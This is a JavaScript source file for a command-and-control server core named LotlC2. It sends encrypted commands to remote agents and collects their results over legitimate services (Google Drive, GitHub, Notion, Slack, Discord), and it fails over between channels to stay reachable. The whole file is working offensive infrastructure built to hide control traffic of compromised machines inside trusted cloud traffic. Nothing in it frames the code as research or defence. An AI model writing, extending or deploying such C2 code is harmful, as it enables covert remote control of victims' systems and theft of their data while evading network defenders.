const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const GDrive = require('./channels/gdrive');
const GitHub = require('./channels/github');
const Notion = require('./channels/notion');
const Slack = require('./channels/slack');
const Discord = require('./channels/discord');

class LotlC2 {
  constructor(configPath) {
    this.config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    this.encryptionKey = this.config.encryptionKey || '00000000000000000000000000000000';
    this.channels = {};
    this.channelStatus = {};
    this.channelPriority = this.config.channelPriority || ['gdrive', 'github', 'notion', 'slack', 'discord'];
    this._initChannels();
  }

  _initChannels() {
    if (this.config.channels.gdrive) {
      this.channels.gdrive = new GDrive(this.config.channels.gdrive);
      this.channelStatus.gdrive = 'unknown';
    }
    if (this.config.channels.github) {
      this.channels.github = new GitHub(this.config.channels.github);
      this.channelStatus.github = 'unknown';
    }
    if (this.config.channels.notion) {
      this.channels.notion = new Notion(this.config.channels.notion);
      this.channelStatus.notion = 'unknown';
    }
    if (this.config.channels.slack) {
      this.channels.slack = new Slack(this.config.channels.slack);
      this.channelStatus.slack = 'unknown';
    }
    if (this.config.channels.discord) {
      this.channels.discord = new Discord(this.config.channels.discord);
      this.channelStatus.discord = 'unknown';
    }
  }

  _encrypt(plaintext) {
    const key = Buffer.from(this.encryptionKey, 'utf8').slice(0, 32);
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let encrypted = cipher.update(plaintext, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return iv.toString('hex') + ':' + encrypted;
  }

  _decrypt(ciphertext) {
    const key = Buffer.from(this.encryptionKey, 'utf8').slice(0, 32);
    const parts = ciphertext.split(':');
    const iv = Buffer.from(parts[0], 'hex');
    const encrypted = parts[1];
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  }

  _b64Encode(str) {
    return Buffer.from(str, 'utf8').toString('base64');
  }

  _b64Decode(str) {
    return Buffer.from(str, 'base64').toString('utf8');
  }

  _splitPayload(payload, maxSize) {
    const chunks = [];
    for (let i = 0; i < payload.length; i += maxSize) {
      chunks.push(payload.substring(i, i + maxSize));
    }
    return chunks;
  }

  async sendCommand(channel, agentId, cmd) {
    const ch = this.channels[channel];
    if (!ch) throw new Error(`Channel "${channel}" not configured`);

    const payload = JSON.stringify({
      agentId,
      command: cmd,
      timestamp: new Date().toISOString()
    });

    const encrypted = this._encrypt(payload);
    const b64 = this._b64Encode(encrypted);

    try {
      const result = await ch.sendCommand(agentId, b64);
      this.channelStatus[channel] = 'up';
      return result;
    } catch (err) {
      this.channelStatus[channel] = 'down';
      throw err;
    }
  }

  async pollCommands(channel, agentId) {
    const ch = this.channels[channel];
    if (!ch) throw new Error(`Channel "${channel}" not configured`);

    try {
      const result = await ch.pollCommands(agentId);
      this.channelStatus[channel] = 'up';
      if (!result || result.length === 0) return [];

      return result.map(item => {
        try {
          const decrypted = this._decrypt(this._b64Decode(item.command));
          const parsed = JSON.parse(decrypted);
          return {
            id: item.id,
            agentId: parsed.agentId,
            command: parsed.command,
            timestamp: parsed.timestamp,
            raw: item
          };
        } catch (e) {
          return null;
        }
      }).filter(Boolean);
    } catch (err) {
      this.channelStatus[channel] = 'down';
      throw err;
    }
  }

  async sendResult(channel, agentId, result) {
    const ch = this.channels[channel];
    if (!ch) throw new Error(`Channel "${channel}" not configured`);

    const payload = JSON.stringify({
      agentId,
      result,
      timestamp: new Date().toISOString()
    });

    const encrypted = this._encrypt(payload);
    const b64 = this._b64Encode(encrypted);

    try {
      const res = await ch.sendResult(agentId, b64);
      this.channelStatus[channel] = 'up';
      return res;
    } catch (err) {
      this.channelStatus[channel] = 'down';
      throw err;
    }
  }

  async testChannel(channel) {
    const ch = this.channels[channel];
    if (!ch) return { channel, status: 'not_configured' };

    try {
      const result = await ch.test();
      this.channelStatus[channel] = result ? 'up' : 'down';
      return { channel, status: this.channelStatus[channel] };
    } catch (err) {
      this.channelStatus[channel] = 'down';
      return { channel, status: 'down', error: err.message };
    }
  }

  getChannelStatus() {
    const statuses = {};
    for (const ch of this.channelPriority) {
      if (this.channels[ch]) {
        statuses[ch] = this.channelStatus[ch] || 'unknown';
      }
    }
    return statuses;
  }

  async sendCommandWithFailover(agentId, cmd) {
    const errors = [];
    for (const ch of this.channelPriority) {
      if (!this.channels[ch]) continue;
      try {
        const result = await this.sendCommand(ch, agentId, cmd);
        return { channel: ch, result };
      } catch (err) {
        errors.push({ channel: ch, error: err.message });
      }
    }
    throw new Error(`All channels failed: ${JSON.stringify(errors)}`);
  }

  async pollAllChannels(agentId) {
    const allCommands = [];
    for (const ch of this.channelPriority) {
      if (!this.channels[ch]) continue;
      try {
        const cmds = await this.pollCommands(ch, agentId);
        allCommands.push(...cmds.map(c => ({ ...c, channel: ch })));
      } catch (err) {
        // channel down, skip
      }
    }
    return allCommands;
  }

  async sendResultWithFailover(agentId, result) {
    const errors = [];
    for (const ch of this.channelPriority) {
      if (!this.channels[ch]) continue;
      try {
        const res = await this.sendResult(ch, agentId, result);
        return { channel: ch, result: res };
      } catch (err) {
        errors.push({ channel: ch, error: err.message });
      }
    }
    throw new Error(`All channels failed to send result: ${JSON.stringify(errors)}`);
  }
}

module.exports = LotlC2;
